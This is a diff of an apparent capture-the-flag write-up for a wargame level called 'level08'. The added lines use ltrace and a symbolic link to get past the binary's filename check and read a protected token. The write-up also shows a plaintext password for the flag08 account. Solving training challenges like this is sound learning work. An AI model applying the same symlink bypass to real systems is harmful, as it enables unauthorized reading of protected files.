@@ -1,3 +1,7 @@
- ln -s /home/user/level08/token /tmp/my_tok && ./level08 /tmp/my_tok
+ # exploiting soft link
+ ltrace ./level08
+ ln -s token my_tok && ./level08 my_tok
  su flag08 quif5eloekouj29ke0vouxean
  getflag
+ 
+# for any reason binary can read only soft links
